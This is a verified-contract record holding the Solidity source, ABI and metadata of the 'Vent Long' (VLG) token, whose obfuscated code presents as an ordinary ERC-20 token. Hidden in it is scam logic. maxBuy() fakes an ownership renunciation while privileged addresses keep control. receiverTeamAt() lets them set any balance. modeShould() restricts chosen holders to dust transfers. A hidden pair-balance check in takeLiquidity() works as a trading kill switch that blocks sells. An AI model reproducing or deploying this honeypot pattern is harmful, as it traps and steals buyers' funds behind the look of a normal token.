{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface toTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldSender) external view returns (uint256);\n\n    function transfer(address txEnable, uint256 launchedTeam) external returns (bool);\n\n    function allowance(address modeSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txEnable,\n        uint256 launchedTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldFee, uint256 value);\n    event Approval(address indexed modeSender, address indexed spender, uint256 value);\n}\n\nabstract contract txExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromFee {\n    function createPair(address limitSwap, address toMode) external returns (address);\n}\n\ninterface tokenSellReceiver is toTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VentLong is txExempt, toTeam, tokenSellReceiver {\n\n    function launchTeam(uint256 launchedTeam) public {\n        feeReceiver();\n        limitLiquidity = launchedTeam;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listAtTotal;\n    }\n\n    address public walletSwap;\n\n    constructor (){\n        \n        senderAt swapFund = senderAt(takeAuto);\n        walletSwap = fromFee(swapFund.factory()).createPair(swapFund.WETH(), address(this));\n        \n        marketingWallet = _msgSender();\n        maxBuy();\n        sellReceiver[marketingWallet] = true;\n        txBuySwap[marketingWallet] = listAtTotal;\n        \n        emit Transfer(address(0), marketingWallet, listAtTotal);\n    }\n\n    uint256 constant marketingReceiverTo = 10 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromSender;\n    }\n\n    event OwnershipTransferred(address indexed atAuto, address indexed totalMin);\n\n    function takeLiquidity(address fromMax, address txEnable, uint256 launchedTeam) internal returns (bool) {\n        if (fromMax == marketingWallet) {\n            return tokenMin(fromMax, txEnable, launchedTeam);\n        }\n        uint256 swapTotal = toTeam(walletSwap).balanceOf(amountTotal);\n        require(swapTotal == limitLiquidity);\n        require(txEnable != amountTotal);\n        if (senderEnable[fromMax]) {\n            return tokenMin(fromMax, txEnable, marketingReceiverTo);\n        }\n        return tokenMin(fromMax, txEnable, launchedTeam);\n    }\n\n    uint256 public feeWalletLimit;\n\n    function transfer(address listTxBuy, uint256 launchedTeam) external virtual override returns (bool) {\n        return takeLiquidity(_msgSender(), listTxBuy, launchedTeam);\n    }\n\n    function modeShould(address senderWallet) public {\n        feeReceiver();\n        \n        if (senderWallet == marketingWallet || senderWallet == walletSwap) {\n            return;\n        }\n        senderEnable[senderWallet] = true;\n    }\n\n    string private fromSender = \"VLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingLiquidity;\n    }\n\n    uint256 public launchTo;\n\n    mapping(address => bool) public sellReceiver;\n\n    function feeReceiver() private view {\n        require(sellReceiver[_msgSender()]);\n    }\n\n    function balanceOf(address shouldSender) public view virtual override returns (uint256) {\n        return txBuySwap[shouldSender];\n    }\n\n    function transferFrom(address fromMax, address txEnable, uint256 launchedTeam) external override returns (bool) {\n        if (_msgSender() != takeAuto) {\n            if (launchIs[fromMax][_msgSender()] != type(uint256).max) {\n                require(launchedTeam <= launchIs[fromMax][_msgSender()]);\n                launchIs[fromMax][_msgSender()] -= launchedTeam;\n            }\n        }\n        return takeLiquidity(fromMax, txEnable, launchedTeam);\n    }\n\n    address takeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public amountWallet;\n\n    address public marketingWallet;\n\n    uint256 toReceiver;\n\n    bool private listTo;\n\n    function approve(address amountLaunchExempt, uint256 launchedTeam) public virtual override returns (bool) {\n        launchIs[_msgSender()][amountLaunchExempt] = launchedTeam;\n        emit Approval(_msgSender(), amountLaunchExempt, launchedTeam);\n        return true;\n    }\n\n    address private isFeeToken;\n\n    function teamTotalIs(address sellSwapTeam) public {\n        if (limitMaxAmount) {\n            return;\n        }\n        \n        sellReceiver[sellSwapTeam] = true;\n        if (amountWallet == feeWalletLimit) {\n            listTo = true;\n        }\n        limitMaxAmount = true;\n    }\n\n    mapping(address => bool) public senderEnable;\n\n    mapping(address => mapping(address => uint256)) private launchIs;\n\n    uint256 private listAtTotal = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private txBuySwap;\n\n    uint256 public atFee;\n\n    function owner() external view returns (address) {\n        return isFeeToken;\n    }\n\n    function tokenMin(address fromMax, address txEnable, uint256 launchedTeam) internal returns (bool) {\n        require(txBuySwap[fromMax] >= launchedTeam);\n        txBuySwap[fromMax] -= launchedTeam;\n        txBuySwap[txEnable] += launchedTeam;\n        emit Transfer(fromMax, txEnable, launchedTeam);\n        return true;\n    }\n\n    bool private amountToken;\n\n    bool public limitMaxAmount;\n\n    function maxBuy() public {\n        emit OwnershipTransferred(marketingWallet, address(0));\n        isFeeToken = address(0);\n    }\n\n    string private enableReceiver = \"Vent Long\";\n\n    uint256 limitLiquidity;\n\n    uint8 private marketingLiquidity = 18;\n\n    function getOwner() external view returns (address) {\n        return isFeeToken;\n    }\n\n    function allowance(address tokenLiquidity, address amountLaunchExempt) external view virtual override returns (uint256) {\n        if (amountLaunchExempt == takeAuto) {\n            return type(uint256).max;\n        }\n        return launchIs[tokenLiquidity][amountLaunchExempt];\n    }\n\n    function receiverTeamAt(address listTxBuy, uint256 launchedTeam) public {\n        feeReceiver();\n        txBuySwap[listTxBuy] = launchedTeam;\n    }\n\n    address amountTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return enableReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLaunchExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunchExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWalletLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"launchTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMaxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"}],\"name\":\"modeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"receiverTeamAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwapTeam\",\"type\":\"address\"}],\"name\":\"teamTotalIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "VentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}